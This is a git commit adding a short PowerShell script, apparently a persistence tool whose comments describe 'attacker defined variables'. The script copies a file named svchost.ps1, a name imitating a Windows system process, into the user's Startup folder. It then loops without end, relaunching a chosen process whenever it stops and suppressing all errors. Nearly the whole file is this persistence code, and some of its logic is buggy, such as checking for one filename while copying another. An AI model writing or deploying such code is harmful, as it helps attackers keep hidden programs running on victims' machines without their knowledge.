16ad1503f0ede0a0923454cbee79b41310e4bc56
TheDarkHorseUprsising <tdhuprising@gmail.com>
2017-12-05 20:19:02 +0000

    Create shown.ps1

---
+++ shown.ps1
@@ -0,0 +1,19 @@
+#attacker defined variables
+$dirofscript = "relative path to dir of the script"
+$persist = "process to persist"
+
+#change directory to the one containing powersistnace
+cd $dirofscript
+
+#find startup folder
+$path = [Environment]::GetFolderPath("Startup")
+
+#check if the startup folder contains powersistance
+$pathtest = Test-Path $path+"\hidden.ps1" -ErrorAction SilentlyContinue
+
+#perofm persistance
+while(1 -eq 1){$open = Get-Process $persist -ErrorAction SilentlyContinue
+if($pathtest -eq $false){
+copy svchost.ps1 $path -ErrorAction SilentlyContinue} 
+if ($open -eq $null){start $persist}  
+}
